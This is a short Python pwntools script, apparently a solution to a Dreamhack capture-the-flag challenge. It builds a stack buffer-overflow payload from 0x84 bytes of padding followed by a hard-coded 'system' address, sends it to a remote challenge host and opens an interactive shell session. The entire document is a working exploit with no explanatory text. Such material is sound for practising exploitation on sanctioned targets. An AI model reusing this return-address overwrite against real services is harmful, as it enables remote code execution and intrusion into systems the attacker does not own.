from pwn import *

system_addr = 0x80485B9
payload =''
payload += 'a'*0x84
payload += p32(system_addr)

r = remote('host1.dreamhack.games', 8377)
r.sendline(payload)
r.interactive()
